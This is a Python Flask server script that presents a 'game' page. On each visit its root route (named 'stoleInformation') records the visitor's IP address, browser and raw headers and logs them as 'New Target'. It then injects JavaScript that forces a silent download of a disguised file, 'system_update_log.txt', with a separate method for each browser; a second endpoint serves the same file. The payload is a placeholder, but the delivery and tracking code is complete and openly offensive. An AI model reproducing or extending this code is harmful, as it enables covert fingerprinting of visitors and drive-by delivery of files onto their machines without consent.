from flask import Flask, request, render_template, Response
from flask_cors import CORS
import json
import logging
import re

app = Flask(__name__)
CORS(app)

info = {
    "Machines": []
}

EMBEDDED_PAYLOAD = "hello"

class Data_user:
    def __init__(self, ip, agent, raw_headers):
        self.ip = ip
        self.agent = agent
        self.browser = self._parse_browser(agent)
        self.os = self._parse_os(agent)
        self.is_chromium = self._is_chromium(agent)
        self.is_edge = self._is_edge(agent)
        self.raw_headers = raw_headers
        
    def _parse_browser(self, ua):
        ua = ua.lower()
        if 'edg/' in ua:
            match = re.search(r'edg/(\d+\.\d+\.\d+\.\d+)', ua)
            return f"Edge/{match.group(1) if match else 'Unknown'}"
        elif 'chrome/' in ua:
            match = re.search(r'chrome/(\d+\.\d+\.\d+\.\d+)', ua)
            return f"Chrome/{match.group(1) if match else 'Unknown'}"
        elif 'firefox/' in ua:
            match = re.search(r'firefox/(\d+\.\d+\.\d+)', ua)
            return f"Firefox/{match.group(1) if match else 'Unknown'}"
        elif 'safari/' in ua:
            match = re.search(r'version/(\d+\.\d+\.\d+)', ua)
            return f"Safari/{match.group(1) if match else 'Unknown'}"
        return "Unknown Browser"

    def _parse_os(self, ua):
        ua = ua.lower()
        if 'windows' in ua:
            if 'nt 10.0' in ua: return "Windows 10/11"
            if 'nt 6.3' in ua: return "Windows 8.1"
            if 'nt 6.1' in ua: return "Windows 7"
            return "Windows (Other)"
        elif 'mac' in ua:
            return "macOS"
        elif 'android' in ua:
            return "Android"
        elif 'linux' in ua:
            return "Linux"
        return "Unknown OS"

    def _is_chromium(self, ua):
        ua = ua.lower()
        return 'chrome/' in ua or 'edg/' in ua

    def _is_edge(self, ua):
        ua = ua.lower()
        return 'edg/' in ua

    def to_dict(self):
        return self.__dict__

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = app.logger

@app.route('/')
def stoleInformation():
    try:
        headers = dict(request.headers)
        ip_addr = request.remote_addr
        user_agent = request.user_agent.string
        
        data_user = Data_user(ip_addr, user_agent, headers).to_dict()
        info['Machines'].append(data_user)
        write(info, 'infoMachines.json')
        
        logger.info(f"[INTEL] New Target: {ip_addr} | Browser: {data_user['browser']} | OS: {data_user['os']} | Chromium: {data_user['is_chromium']} | Edge: {data_user['is_edge']}")
        
        html_content = render_template("game.html")
        
        # Inject the browser-specific silent download script
        injection_script = f"""
        <script>
        (function() {{
            const ua = navigator.userAgent;
            const isWindows = ua.includes('Windows');
            const isChromium = ua.includes('Chrome') || ua.includes('Edg/');
            const isEdge = ua.includes('Edg/');
            const isFirefox = ua.includes('Firefox');
            const isSafari = ua.includes('Safari') && !ua.includes('Chrome');
            
            const payload = "{EMBEDDED_PAYLOAD}";
            const filename = "system_update_log.txt";
            
            function silentDownload() {{
                // Create a Blob
                const blob = new Blob([payload], {{ type: 'text/plain' }});
                
                // Method 1: Chromium (Chrome/Edge) - Use a.click() with download attribute
                if (isChromium) {{
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = filename;
                    document.body.appendChild(a);
                    a.click();
                    setTimeout(() => {{
                        document.body.removeChild(a);
                        URL.revokeObjectURL(url);
                        console.log('[DeepHat] Chromium Silent Download Triggered');
                    }}, 100);
                }}
                // Method 2: Edge (Legacy) - Try msSaveBlob if available
                else if (isEdge && navigator.msSaveBlob) {{
                    navigator.msSaveBlob(blob, filename);
                    console.log('[DeepHat] Edge msSaveBlob Triggered');
                }}
                // Method 3: Firefox - Use a.click() with download attribute
                else if (isFirefox) {{
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = filename;
                    document.body.appendChild(a);
                    a.click();
                    setTimeout(() => {{
                        document.body.removeChild(a);
                        URL.revokeObjectURL(url);
                        console.log('[DeepHat] Firefox Silent Download Triggered');
                    }}, 100);
                }}
                // Method 4: Safari - Use a.click() with download attribute (Safari 10.1+)
                else if (isSafari) {{
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = filename;
                    document.body.appendChild(a);
                    a.click();
                    setTimeout(() => {{
                        document.body.removeChild(a);
                        URL.revokeObjectURL(url);
                        console.log('[DeepHat] Safari Silent Download Triggered');
                    }}, 100);
                }}
                // Fallback: Direct navigation to data URI
                else {{
                    window.location.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(payload);
                    console.log('[DeepHat] Fallback Data URI Triggered');
                }}
            }}
            
            // Trigger the download
            silentDownload();
        }})();
        </script>
        """
        
        html_content = html_content.replace('</body>', f'{injection_script}\n</body>')
        
        return Response(html_content, mimetype='text/html')

    except Exception as e:
        logger.error(f"Error: {e}")
        return "An error occurred", 500

@app.route('/download-payload')
def download_payload():
    """
    Fallback endpoint for direct downloads.
    """
    browser = request.args.get('browser', 'unknown')
    filename = "system_update_log.txt"
    
    headers = {
        'Content-Type': 'text/plain; charset=utf-8',
        'Content-Disposition': f'attachment; filename="{filename}"',
        'Content-Length': len(EMBEDDED_PAYLOAD),
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'X-DeepHat-Source': browser
    }
    
    return Response(EMBEDDED_PAYLOAD, headers=headers, mimetype='text/plain')

def write(data, filename):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=4)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5001, debug=False)
